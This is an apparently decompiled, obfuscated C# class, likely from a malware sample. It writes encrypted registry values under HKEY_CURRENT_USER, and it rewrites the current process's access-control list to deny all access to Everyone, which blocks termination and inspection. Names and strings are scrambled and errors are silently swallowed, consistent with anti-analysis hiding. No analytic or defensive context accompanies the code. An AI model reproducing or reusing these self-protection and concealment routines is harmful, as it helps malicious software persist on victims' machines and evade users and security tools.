using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

internal sealed class cMESdiHKvNDG
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr OZZuanXMpsCRqQn, int bOKxxBznBWRG, [Out] byte[] gAALcCYZiRZ, uint EEBUyJuUBTHcco, out uint sTHVHfcSYuiK);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr JkZiBURCRvKnN, int fUzghVknjxIk, [In] byte[] mtijEpPUVzE);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void apUnnSlynMhrWJ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371156)));
			registryKey.SetValue(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371051)), getString_0(107395910));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor OnVPDKiZxQSf(IntPtr intptr_0)
	{
		byte[] gAALcCYZiRZ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, gAALcCYZiRZ, 0u, out var sTHVHfcSYuiK);
		if ((long)sTHVHfcSYuiK > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, gAALcCYZiRZ = new byte[sTHVHfcSYuiK], sTHVHfcSYuiK, out sTHVHfcSYuiK))
		{
			return null;
		}
		return new RawSecurityDescriptor(gAALcCYZiRZ, 0);
	}

	private void iUGPnKToCpbM(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void mQqOVtJdsDjRKzd()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = OnVPDKiZxQSf(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			iUGPnKToCpbM(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static cMESdiHKvNDG()
	{
		Strings.CreateGetStringDelegate(typeof(cMESdiHKvNDG));
	}
}
